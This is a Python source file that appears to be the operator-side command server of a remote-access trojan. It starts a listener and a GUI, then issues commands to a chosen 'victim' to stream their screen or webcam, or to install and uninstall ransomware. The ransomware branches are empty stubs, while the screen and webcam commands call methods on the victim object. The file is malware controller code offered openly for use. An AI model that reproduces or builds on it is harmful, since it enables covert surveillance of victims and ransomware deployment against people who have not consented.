from os.path import abspath, dirname
import sys

d = dirname(dirname(abspath(__file__)))
sys.path.append(d)

import threading
from constants import INSTALL_RANSOMWARE_COMMAND, UNINSTALL_RANSOMWARE_COMMAND, WATCH_SCREEN_COMMAND, WATCH_WEBCAM_COMMAND
from host_constants import HOST_IP, HOST_PORT
from classes.host_gui import HostWithGui

hostWithGUI = None


def startButtonOnClick(command, selectedVictim):
    """
    Called when the start button is clicked

    param 1: the command to executes
    param 2: the victim to executing the command on

    param 1 type: str
    param 2 type: Victim
    """
    processCommand(command, selectedVictim)


def processCommand(command, selectedVictim):
    """
    Process and executes the command

    param 1: the command
    param 2: the ip of the victim to apply the command on

    param 1 type: str
    param 2 type: Victim
    """

    # Checks if the command is already running
    if command == WATCH_SCREEN_COMMAND and selectedVictim.isScreenSharingRunning():
        hostWithGUI.showError("Screen Sharing Error!",
                              "The screen sharing is already running!")
        return

    elif command == WATCH_WEBCAM_COMMAND and selectedVictim.isWebCamSharingRunning():
        hostWithGUI.showError("Web Camera Sharing Error!",
                              "The web camera sharing is already running!")
        return

    elif command == INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command == UNINSTALL_RANSOMWARE_COMMAND:
        pass

    # Executes the command
    if command == WATCH_SCREEN_COMMAND:
        selectedVictim.watchScreen()

    elif command == WATCH_WEBCAM_COMMAND:
        selectedVictim.watchWebCam()

    elif command == INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command == UNINSTALL_RANSOMWARE_COMMAND:
        pass


def main():
    global hostWithGUI
    hostWithGUI = HostWithGui(HOST_IP, HOST_PORT, [WATCH_SCREEN_COMMAND, WATCH_WEBCAM_COMMAND,
                                                   INSTALL_RANSOMWARE_COMMAND, UNINSTALL_RANSOMWARE_COMMAND], processCommand)

    threading.Thread(target=hostWithGUI.startServer).start()
    hostWithGUI.buildGUI()


if __name__ == "__main__":
    main()
